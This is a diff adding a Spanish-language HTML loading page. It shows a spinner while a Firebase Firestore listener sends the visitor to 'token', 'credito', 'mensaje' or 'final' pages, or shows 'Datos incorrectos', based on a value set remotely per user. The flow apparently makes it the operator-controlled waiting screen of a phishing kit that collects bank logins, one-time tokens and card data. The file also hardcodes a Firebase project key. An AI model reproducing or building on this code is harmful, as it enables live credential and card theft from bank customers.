@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <title>Document</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+      import {
+        getFirestore,
+        doc,
+        setDoc,
+        onSnapshot,
+      } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+
+      const firebaseConfig = {
+        apiKey: "AIzaSyDFYJf5HrCfbyEkggIHJ6hcgQJpUKMfzc0",
+        authDomain: "basedtos-84767.firebaseapp.com",
+        projectId: "basedtos-84767",
+        storageBucket: "basedtos-84767.appspot.com",
+        messagingSenderId: "622608516389",
+        appId: "1:622608516389:web:b3c12b4a3537c1bfff06cc",
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+
+      window.db = db; // Hacer db accesible globalmente
+      window.doc = doc;
+      window.setDoc = setDoc;
+      window.onSnapshot = onSnapshot;
+    </script>
+  </head>
+  <body
+    style="
+      display: flex;
+      background: #2d4269;
+      height: 100vh;
+      justify-content: center;
+      align-items: center;
+    "
+  >
+    <img src="images/cargando.gif" style="max-width: 250px; width: 100%" />
+  </body>
+  <script>
+    document.addEventListener("DOMContentLoaded", () => {
+      const questionRef = window.doc(
+        window.db,
+        "bogot1",
+        localStorage.getItem("usuario")
+      );
+
+      // Usa `onSnapshot` directamente
+      onSnapshot(questionRef, (doc) => {
+        if (doc.exists()) {
+          const questionData = doc.data();
+          console.log("New question:", questionData.question);
+          console.log("Current page:", questionData.page);
+
+          // Redirecciona basado en el valor de `page`
+          switch (questionData.page) {
+            case 1:
+              window.location.href = "index.html";
+              break;
+            case 2:
+              window.location.href = "token.html";
+              break;
+            case 3:
+              window.location.href = "credito.html";
+              break;
+            case 4:
+              window.location.href = "mensaje.html";
+              break;
+            case 5:
+              alert("Datos incorrectos");
+              window.location.href = "index.html";
+              break;
+            case 6:
+              window.location.href = "final.html";
+              break;
+
+            default:
+              console.log("Page not recognized.");
+          }
+
+          // hideOverlay(); // Descomentar esta línea si tienes una función para ocultar el overlay
+        } else {
+          console.log("No such document!");
+        }
+      });
+    });
+  </script>
+</html>
